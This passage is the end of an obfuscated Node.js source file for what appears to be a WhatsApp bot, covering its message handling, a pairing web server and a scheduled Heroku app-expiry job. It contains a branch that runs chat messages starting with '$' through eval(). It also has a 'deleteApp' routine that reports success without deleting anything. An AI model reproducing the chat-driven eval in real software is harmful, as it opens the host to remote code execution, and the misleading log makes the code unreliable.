                                        }, {
                                          'quoted': _0x8d179e
                                        });
                                      }
                                    }
                                    _0x3de94b();
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              } else {
                console.log("Original message not found for revocation.");
              }
            }
            if (!_0x7aa660) {
              if (_0x227dc7.msg && _0x227dc7.msg.type === 0x0) {
                _0x4eda7f(_0x227dc7);
              } else {
                _0xd4ca6c(_0x227dc7);
              }
            }
          }
        }
      }
      switch (_0x69c192) {
        case "jid":
          _0x428492(_0x416738);
          break;
        default:
          if (_0x1c4d12 && _0x2383b2.startsWith('$')) {
            let _0x5a328c = _0x2383b2.split('$')[0x1];
            let _0x2b39f3 = _0x5a328c.replace('°', ".toString()");
            try {
              let _0x503964 = await eval(_0x2b39f3);
              if (typeof _0x503964 === "object") {
                _0x428492(util.format(_0x503964));
              } else {
                _0x428492(util.format(_0x503964));
              }
            } catch (_0x58dc34) {
              _0x428492(util.format(_0x58dc34));
            }
          }
      }
    } catch (_0x935b3d) {
      const _0x4851da = String(_0x935b3d);
      console.log(_0x4851da);
    }
  });
}
let code = require("./lib/sessions/pair");
require("events").EventEmitter.defaultMaxListeners = 0x1f4;
app.use('/code', code);
app.use('/', async (_0x4840a8, _0x4e7453, _0x59c8ec) => {
  _0x4e7453.sendFile(__path + '/lib/sessions/pair.html');
});
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({
  'extended': true
}));
app.listen(PORT, () => {
  console.log("Server running on http://localhost:" + PORT);
});
setTimeout(() => {
  connectToWA();
}, 0xbb8);
const schedule = require("node-schedule");
const HamzaConfig = require("./settings.js");
const HEROKU_API_KEY = HamzaConfig.HEROKU_API_KEY;
const APP_NAME = HamzaConfig.HEROKU_APP_NAME;
const DELETE_DATE = moment.tz(HamzaConfig.BOT_EXPIRY_DATE + " " + HamzaConfig.BOT_EXPIRY_TIME, "Asia/Karachi").toDate();
const deleteApp = async () => {
  try {
    console.log("App " + APP_NAME + " deleted successfully.");
  } catch (_0x2f611a) {
    console.error("Error deleting the app:", _0x2f611a.response ? _0x2f611a.response.data : _0x2f611a.message);
  }
};
schedule.scheduleJob(DELETE_DATE, deleteApp);
